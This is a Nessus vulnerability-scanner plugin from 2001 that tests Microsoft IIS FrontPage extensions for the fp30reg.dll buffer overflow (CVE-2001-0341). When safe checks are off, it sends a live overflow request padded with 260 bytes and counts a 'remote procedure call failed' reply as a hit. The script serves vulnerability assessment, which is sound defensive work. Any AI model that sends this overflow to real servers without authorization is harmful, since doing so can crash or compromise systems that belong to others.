#
# This script was written by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10699);
 script_cve_id("CVE-2001-0341");
 script_bugtraq_id(2906);
 script_version ("$Revision: 1.18 $");

 name["english"] = "IIS FrontPage DoS II";
 script_name(english:name["english"]);

 desc["english"] = "
Microsoft IIS, running Frontpage extensions, is
vulnerable to a remote buffer overflow attack. An
attacker, exploiting this bug, may gain access to
confidential data, critical business processes, and
elevated privileges on the attached network.


Solution: See http://www.nsfocus.com/english/homepage/sa01-03.htm 
          and http://www.microsoft.com/technet/security/bulletin/MS01-035.asp

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Attempts to overflow the fp30reg.dll dll";
 script_summary(english:summary["english"]);
 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 2001 John Lampe");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"],
               francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_keys("www/iis");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port=get_kb_item("Services/www");
if(!port)port=80;

if(safe_checks())
{
 if(is_cgi_installed(item:"/_vti_bin/_vti_aut/fp30reg.dll", port:port))
 {
  alrt = "
The CGI /_vti_bin/_vti_aut/fp30reg.dll is installed.
Some versions of this CGI are vulnerable to a buffer
overflow that would allow a remote attacker to execute 
arbitrary code on this host.

See http://www.nsfocus.com/english/homepage/sa01-03.htm for
details.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Risk factor : High
Solution : Delete it or see http://www.microsoft.com/technet/security/bulletin/MS01-035.asp";
 security_hole(port:port, data:alrt);
 }
 exit(0);
}

#Make sure app is alive...
mystring = string("HEAD / HTTP/1.0\r\n\r\n");
if(get_port_state(port)) {
    mysoc = open_sock_tcp(port);
    if(mysoc)
    {
    send(socket:mysoc, data:mystring);
    incoming = http_recv(socket:mysoc);
    if(!incoming) {exit(0);}
    close(mysoc);
    }
}


mystring= string ("GET /_vti_bin/_vti_aut/fp30reg.dll?" , crap(260), " HTTP/1.0\r\n\r\n");
if(get_port_state(port)) {
        mysoc = open_sock_tcp(port);
        if(mysoc) {
            send(socket:mysoc, data:mystring);
            incoming=http_recv(socket:mysoc);
            match = egrep(pattern:".*The remote procedure call failed*" ,
		string:incoming);
            if(match) {security_hole(port);}
            close (mysoc);
        }
}
